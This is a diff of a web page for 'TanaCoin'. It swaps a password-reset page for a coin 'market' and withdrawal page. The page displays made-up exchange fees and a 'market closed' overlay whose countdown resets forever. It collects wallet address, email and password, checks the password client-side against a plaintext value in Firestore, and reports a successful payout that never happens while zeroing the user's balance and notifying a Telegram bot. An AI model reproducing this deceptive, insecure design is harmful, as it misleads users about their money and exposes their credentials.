@@ -1,157 +1,409 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Forgot Password</title>
-  <link rel="stylesheet" href="style.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coin Market</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 0;
+}
 
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #bfffbf;
-      color: #333;
-    }
+header {
+    background-color: #007bff;
+    color: white;
+    padding: 1rem;
+    text-align: center;
+}
 
-    header {
-      background-color: black;
-      padding: 10px 0;
-      text-align: center;
-    }
+h1 {
+    margin: 0;
+}
 
-    nav ul {
-      list-style-type: none;
-      text-align: center;
-    }
+main {
+    margin: 20px;
+}
 
-    nav ul li {
-      display: inline;
-      margin-right: 20px;
-    }
+.balance-section, .market-section, .wallet-section {
+    margin: 20px 0;
+}
 
-    nav ul li a {
-      color: white;
-      text-decoration: none;
-    }
 
-    .container {
-      margin: 50px auto;
+
+button {
+    padding: 10px;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    cursor: pointer;
+    margin-top: 10px; 
+}
+
+.hidden {
+    display: none;
+}
+
+button {
+    padding: 10px;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #0056b3;
+}
+
+#withdrawal-form {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-top: 10px;
+}
+
+#withdrawal-message {
+    margin-top: 10px;
+    color: red;
+}
+
+#notification-section {
+    background-color: #d4edda;
+    padding: 10px;
+    border: 1px solid #c3e6cb;
+    color: #155724;
+}
+
+/* Sanya duhu a shafin baki daya */
+.overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.8); /* Duhu tare da haske 80% */
+    z-index: 9999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: white;
+    font-size: 25px;
+    text-align: center;
+}
+
+/* Daga style na sakon TanaCoin */
+.gutt{
+    font-size: 25px;
+    color: #fff;
+    text-shadow: 0 0 1px #0f0, 0 0 20px #0f0, 0 0 30px #0f0, 0 0 40px #0f0;
+}
+.gut{
+    font-size: 25px;
+    color: #ff3;
+    text-shadow: 3px 3px 0 #e60000, 6px 6px 0 #ffb3b3;
+}
+.Fut{
+    font-size: 25px;
+    background: linear-gradient(to right, #8e44ad, #3498db);
+    -webkit-background-clip: text;
+    color: transparent;
+}
+
+</style>
+<style>
+
+ .market-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .market-option {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 0; 
+        }
+
+        .market-img {
+            width: 100px; 
+            margin-bottom: 0;
+            Border-radius:10px;
+        }
+
+        .market-option p, .market-option button {
+            margin: 0; 
+        }
+        
+input{
+           padding: 18px;
+            margin-bottom: 20px;
+            border: 1px solid #90ff2b;
+            border-radius: 5px;
+            font-size: 10px;
+            Font-weight:bold;
+       }
+    .wel{
+        
+      font-size: 20px;
+      color: ##ff2b74;
+      text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
+        text-align: center;
+        Color:#70ff40;
+      }
+     .container{
       width: 80%;
-      max-width: 400px;
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            background-image:url("by.png");
+            
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+            position: relative;
+            Text-align:center;
+            Font-weight:bold;
+            Font-size:30px;
+        }
+         .notice-container {
+      width: 100%;
+      border-radius: 10px;
+      padding: px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      max-width: 500px;
+      width: 100%;
       text-align: center;
     }
-
-    .container h2 {
-      margin-bottom: 20px;
+    .notice-container h2 {
+      color: #ff5e5e;
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+    .notice-container p {
       color: #333;
+      font-size: 16px;
+      line-height: 1.6;
     }
-
-    .container form {
-      display: flex;
-      flex-direction: column;
+    .notice-container strong {
+      color: #ff5e5e;
     }
-
-    .container form input {
-      padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #50ff00;
-      border-radius: 5px;
-    }
-
-    .container form button {
-      padding: 10px;
-      background-color: #70ff15;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    .container form button:hover {
-      background-color: #3115ff;
-    }
-
-    #message {
-      color: red;
-      margin-top: 10px;
-    }
-
-    footer {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 14px;
-      color: #777;
-    }
-  </style>
+    </style>
 </head>
 <body>
-  <header>
-    <nav>
-      <ul>
-        <li><a href="index.html">Register</a></li>
-        <li><a href="login.html">Login</a></li>
-      </ul>
-    </nav>
-  </header>
+    
 
-  <section class="container">
-    <h2>Forgot  Password?</h2>
-    <p>Enter your email address below, and we'll send you a password reset link.</p>
-    <form id="forgotForm">
-      <input type="email" id="forgotEmail" placeholder="Enter your email address" required>
-      <button type="submit">Submit</button>
-    </form>
-    <div id="message"></div>
-  </section>
+    <header>
+        <h1 id="welcome-text">Welcome To Sell your <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> Username</h1>
+    </header>
 
-  <footer>
-    <p>&copy; 2024 <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i></p>
-  </footer>
+    <main>
+        <section class="balance-section">
+            <p>Your Total <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i>: 
+                <span id="userBalance">0.0000</span>
+            </p>
+            <p>Market <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> Price: 
+                $<span id="market-price">5.8648</span> per <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i>
+            </p>
+        </section>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-    import { getAuth, sendPasswordResetEmail } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
+        <section class="market-section">
+        <div class="market-option">
+            <img src="b.png" alt="Binance" class="market-img">
+            <p>5.905% fee</p>
+            <button id="binanceBtn" >Sell on Binance</button>
+        </div>
+        <div class="market-option">
+            <img src="c.png" alt="Coinbase" class="market-img">
+            <p>6.2979% fee</p>
+            <button id="coinbaseBtn">Sell on Coinbase</button>
+        </div>
+    </section>
 
-    // Firebase configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyCldVBlGP7hsERLEa9R30PSYZEOXppYvDs",
-      authDomain: "tanacoin-75344.firebaseapp.com",
-      projectId: "tanacoin-75344",
-      storageBucket: "tanacoin-75344.appspot.com",
-      messagingSenderId: "425342256564",
-      appId: "1:425342256564:web:b33f74f41e8d7d62659ee1"
-    };
+        <section class="wallet-section">
+            <h2 class="wel"><center>Your Dollars TRC20 WELLET</center></h2>
+  <center class="container">        <p>Balance: $<span id="usdBalance">0.00</span></p></center>
+  
+  <div class="overlay">
+    <div>
+        <h2 class="gutt"><i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> Chenge Market is Closed</h2>
+        <p class="gut">Chenge <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> will reopen automatically when the Aidrop Mine Ends.</p>
+        <h3 class="Fut"><i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> Mining Time Court: <span id="endTime"></span></h3>
+    </div>
+</div>
+  
+  <div class="notice-container">
+    <h2>Notice</h2>
+    <p>
+      Before you click <strong>submit</strong>, please ensure you have entered your 
+      <strong>TRC20 wallet address</strong>. You can use a TRC20 wallet from Telegram or any other wallet, 
+      but it must be a TRC20 wallet address only. You will lose your funds if you enter a 
+      different address that is not TRC20.
+    </p>
+  </div>
+            <button id="withdrawBtn"><center>Withdrawal</center></button>
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-        document.getElementById('forgotForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const email = document.getElementById('forgotEmail').value;
-      const messageDiv = document.getElementById('message');
+            <div id="withdrawal-container" class="hidden">
+                <form id="withdrawal-form">
+                    <input type="number" id="withdrawal-amount" placeholder="Amount $" required>
+                    <input type="text" id="telegram-wallet" placeholder=" Your Telegram Wallet TRC20 Address" required>
+                    <input type="email" id="email" placeholder="Your Email Address" required>
+                    <input type="password" id="password" placeholder="Your Password" required>
+                    <button type="submit">Submit</button>
+                </form>
+                <p id="withdrawal-message"></p>
+            </div>
+        </section>
 
-      sendPasswordResetEmail(auth, email)
-        .then(() => {
-          messageDiv.style.color = 'green';
-          messageDiv.textContent = 'A reset password link has been sent to your email address.';
-        })
-        .catch((error) => {
-          if (error.code === 'auth/user-not-found') {
-            messageDiv.textContent = 'This email address is not registered for TanaCoin Mine.';
-          } else {
-            messageDiv.textContent = `Error: ${error.message}`;
-          }
+        <section id="notification-section" class="hidden">
+            <p id="notification-message">Payment successfully made to your Telegram Wallet!</p>
+        </section>
+    </main>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
+
+// Firebase config
+const firebaseConfig = {
+    apiKey: "AIzaSyCldVBlGP7hsERLEa9R30PSYZEOXppYvDs",
+    authDomain: "tanacoin-75344.firebaseapp.com",
+    projectId: "tanacoin-75344",
+    storageBucket: "tanacoin-75344.appspot.com",
+    messagingSenderId: "425342256564",
+    appId: "1:425342256564:web:b33f74f41e8d7d62659ee1"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// Specific user ID
+const userId = "ShIKsA9c3xzVpTU16X66";
+
+
+
+// Elements
+const usernameEl = document.getElementById('welcome-text');
+const userBalanceEl = document.getElementById('userBalance');
+const usdBalanceEl = document.getElementById('usdBalance');
+const marketPriceEl = document.getElementById('market-price');
+const withdrawalMessageEl = document.getElementById('withdrawal-message');
+
+// Fetch user data from Firestore
+async function getUserData() {
+    const userDoc = await getDoc(doc(db, "users", userId));
+    if (userDoc.exists()) {
+        const data = userDoc.data();
+        usernameEl.innerHTML = `Welcome To Sell your <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> (${data.username || "Guest"})`;
+        userBalanceEl.innerText = data.tanaCoinBalance ? data.tanaCoinBalance.toFixed(4) : "0.0000";
+        usdBalanceEl.innerText = data.usdBalance ? data.usdBalance.toFixed(2) : "0.00";
+    } else {
+        alert("User data not found!");
+    }
+}
+getUserData();
+
+// Calculate exchange
+function calculateExchange(tanaCoin, feeRate) {
+    const marketPrice = parseFloat(marketPriceEl.innerText);
+    const totalAmount = tanaCoin * marketPrice;
+    const fee = totalAmount * feeRate / 100;
+    return (totalAmount - fee).toFixed(8);
+}
+
+// Binance button click
+document.getElementById('binanceBtn').addEventListener('click', () => {
+    const tanaCoin = parseFloat(userBalanceEl.innerText);
+    const finalAmount = calculateExchange(tanaCoin, 5.905);
+    alert(`You will receive $${finalAmount} after a 5.905% fee.`);
+});
+
+// Coinbase button click
+document.getElementById('coinbaseBtn').addEventListener('click', () => {
+    const tanaCoin = parseFloat(userBalanceEl.innerText);
+    const finalAmount = calculateExchange(tanaCoin, 6.2979);
+    alert(`You will receive $${finalAmount} after a 6.2979% fee.`);
+});
+
+// Handle Withdrawal
+document.getElementById('withdrawBtn').addEventListener('click', () => {
+    document.getElementById('withdrawal-container').classList.toggle('hidden');
+});
+
+// Handle Withdrawal with new validation
+document.getElementById('withdrawal-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const password = document.getElementById('password').value;
+    const withdrawalAmount = parseFloat(document.getElementById('withdrawal-amount').value);
+    const wallet = document.getElementById('telegram-wallet').value;
+
+    const userDoc = await getDoc(doc(db, "users", userId));
+    const userData = userDoc.data();
+
+    // Check password and balance
+    if (password === userData.password && userData.tanaCoinBalance > 0) {
+        const marketPrice = parseFloat(marketPriceEl.textContent);
+        const totalWithdrawal = userData.tanaCoinBalance * marketPrice;
+
+        if (withdrawalAmount > totalWithdrawal) {
+            withdrawalMessageEl.textContent = 'Withdrawal amount exceeds available balance.';
+            return;
+        }
+
+        usdBalanceEl.textContent = (parseFloat(usdBalanceEl.textContent) + totalWithdrawal).toFixed(2);
+
+        // Display success message
+        withdrawalMessageEl.textContent = `Withdrawal successful! $${totalWithdrawal} sent to TRC20 Wallet Address: ${wallet}`;
+
+        // Update user balance in Firestore
+        await updateDoc(doc(db, "users", userId), {
+            tanaCoinBalance: 0
         });
-    });
-  </script>
+
+        // Send message to Telegram bot
+        const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
+        const chatId = "YOUR_TELEGRAM_CHAT_ID";
+        const message = `Withdrawal alert: $${totalWithdrawal} sent to TRC20 Wallet Address: ${wallet}`;
+
+        // Send withdrawal details to Telegram bot
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("Message sent to Telegram successfully.");
+                } else {
+                    console.error("Error sending message to Telegram:", data);
+                }
+            }).catch(error => {
+                console.error("Error in Telegram communication:", error);
+            });
+    } else {
+        withdrawalMessageEl.textContent = "Incorrect password or insufficient balance.";
+    }
+});
+
+let totalCoins = 246.9;
+const dailyCoins = 24.5902;
+const startDate = new Date('2024-01-01');
+const endTimeElement = document.getElementById('endTime');
+
+function updateTanaCoinMining() {
+    const now = new Date();
+    const daysPassed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
+    const totalMined = totalCoins + (daysPassed * dailyCoins);
+    
+    // Ƙirƙiri lokacin ƙarshen mining
+    const endTime = new Date(now.getTime() + (1000 * 60 * 60 * 24));
+    endTimeElement.textContent = endTime.toLocaleString();
+}
+
+setInterval(updateTanaCoinMining, 1000);
+updateTanaCoinMining();
+</script>
 </body>
 </html>
